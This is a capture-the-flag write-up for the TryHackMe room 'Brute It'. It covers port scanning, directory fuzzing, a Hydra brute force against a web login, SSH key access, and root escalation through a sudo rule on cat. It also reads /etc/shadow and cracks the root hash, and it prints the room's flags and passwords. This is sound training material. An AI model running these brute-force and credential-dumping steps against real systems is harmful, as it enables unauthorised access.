---
title: 'TryHackMe - Brute It'
author: r2cook
categories: [TryHackMe]
tags: [ftp, ssh, john, rsa, hydra, PrivEsc, nano]
render_with_liquid: false
media_subpath: /images/thm/Brute-It/
image:
  path: room_card.png
---

> In this write-up, we compromise a vulnerable web admin panel by combining **directory fuzzing, source-code hint discovery, and Hydra-based brute forcing** to recover valid credentials.
> After gaining panel access, we uncover an exposed **SSH private key** for user `john`, use the disclosed passphrase to establish a foothold, and escalate privileges through a dangerously misconfigured **NOPASSWD sudo rule on `/bin/cat`**.
>
> This room is an excellent beginner-friendly demonstration of how **weak passwords, exposed secrets, and overly permissive sudo rights** can quickly lead to full root compromise.


## Initial Setup

Add the target machine to your `/etc/hosts` file:

```plaintext
10.130.144.29 bruteit.thm
```
{: file="/etc/hosts" }

---

## Enumeration

### Full Port Scan

```shell
nmap -p- -sV -sC -Pn --min-rate 1000 -oN nmap_full_scan.txt bruteit.thm
```
{: .nolineno }

### Scan Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

### Key Findings

- SSH service running on port **22**
    
- Web server running on port **80**
    
- Default Apache page detected
    

---


## Web Enumeration

![](Image_1.png){: width="800" height="400" .shadow }

### Directory Fuzzing

```shell
ffuf -u http://bruteit.thm/FUZZ \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
-e .php,.txt,.bak,.zip,.old,.log \
-mc 200,204,301,302,307,401,403 -c | tee ffuf_result.txt
```
{: .nolineno }

### Result

Discovered endpoint:

```
/admin
```

---

![](Image_2.png){: width="800" height="400" .shadow }
![](Image_3.png){: width="800" height="400" .shadow }

---

### Page Source Analysis

Viewing the page source reveals a comment:

![](Image_4.png){: width="800" height="400" .shadow }


```html
<!-- Hey john, if you do not remember, the username is admin -->
```

Valid username identified: **admin**

---


### Login Attempt

Tried default credentials:

```
admin : admin
```

Response:

```
Username or password invalid
```


![](Image_5.png){: width="800" height="400" .shadow }

---

## Brute-Force Attack (Hydra)

### Captured Request (via Burp Suite)

![](Image_6.png){: width="800" height="400" .shadow }

```http
POST /admin/ HTTP/1.1
Host: bruteit.thm
Content-Type: application/x-www-form-urlencoded

user=admin&pass=jhon
```

---

### Hydra Command

```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt bruteit.thm http-post-form \
"/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid"
```
{: .nolineno }

---

### Credentials Found

```
Username: admin
Password: xavier
```

![](Image_7.png){: width="800" height="400" .shadow }

---

## Web Access

After logging in:

- Found **web flag**
    
- Found **RSA private key for user john**
    

### Web Flag

```text
THM{brut3_f0rce_is_e4sy}
```

---

![](Image_8.png){: width="800" height="400" .shadow }
![](Image_9.png){: width="800" height="400" .shadow }
![](Image_10.png){: width="800" height="400" .shadow }

---

### SSH Key Passphrase

```text
rockinroll
```

---

## Foothold (SSH Access)

Login using the private key:

```shell
ssh -i id_rsa john@bruteit.thm
```
{: .nolineno }

---

![](Image_11.png){: width="800" height="400" .shadow }

---

### User Flag

```text
THM{a_password_is_not_a_barrier}
```

---

## Privilege Escalation  (PrivEsc)

### Sudo Permissions

```shell
sudo -l
```
{: .nolineno }

Output:

```text
User john may run the following commands:
(root) NOPASSWD: /bin/cat
```

---

### Exploitation

The `cat` binary can be used to read any file as root.

```shell
sudo /bin/cat /root/root.txt
```
{: .nolineno }

---

![](Image_12.png){: width="800" height="400" .shadow }

---

### Root Flag

```text
THM{pr1v1l3g3_3sc4l4t10n}
```

---

## Extracting Root Password (Optional)

### Dump `/etc/shadow`

```shell
sudo /bin/cat /etc/shadow
```
{: .nolineno }

Example:

```text
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:...
```

![](Image_13.png){: width="800" height="400" .shadow }

---

### Crack Hash with John

```shell
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
{: .nolineno }

---

### Root Password

```text
football
```

---

![](Image_14.png){: width="800" height="400" .shadow }

---